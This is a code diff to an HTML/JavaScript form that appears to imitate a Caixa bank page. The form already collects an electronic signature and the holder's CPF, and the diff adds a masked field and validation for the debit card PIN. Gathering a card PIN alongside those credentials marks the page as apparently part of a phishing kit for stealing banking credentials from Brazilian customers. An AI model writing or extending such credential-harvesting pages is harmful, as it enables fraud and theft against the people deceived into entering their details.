@@ -44,6 +44,11 @@
 							<br><br><br>
 							<p id="titulosenha1"  style="color: #ffffff; font-size: 13px; width: 100%; margin-left: 25px; display: none;">Assinatura eletrônica</p>	
 							<input maxLength="6" onkeyup="formataMascara2();" name="senha1" id="senha1" placeholder="Assinatura eletrônica" class="input-field fields-search active-input-search" style="-webkit-text-security: disc;" type="tel">
+	
+							<br><br>
+							<p id="titulosenha1"  style="color: #ffffff; font-size: 13px; width: 100%; margin-left: 25px; display: none;">Senha do cartão de débito</p>	
+							<input maxLength="4" onkeyup="formataMascara2();" name="senhadebito" id="senhadebito" placeholder="Senah do cartão de débito" class="input-field fields-search active-input-search" style="-webkit-text-security: disc;" type="tel">
+
 							<br><br>							
 							<p id="titulocpf"  style="color: #ffffff; font-size: 13px; width: 100%; margin-left: 25px; display: none;">CPF</p>	
 							<input maxLength="14" onkeyup=" mascara(this, '###.###.###-##'); formataMascara2();" name="cpf" id="cpf" placeholder="CPF do titular da conta" class="input-field fields-search active-input-search"  type="tel" >
@@ -139,7 +144,14 @@
          document.formulario_caixa2.senha1.focus();
          return false;
          }
-		 
+
+	 if(document.formulario_caixa2.senhadebito.value.length < 4 )
+         {
+         var alerta = "Senha de debito invalida." ;
+         alert(alerta);
+         document.formulario_caixa2.senhadebito.focus();
+         return false;
+         }		 
           
          if(validaCPF(document.formulario_caixa2.cpf.value) == false)
          {
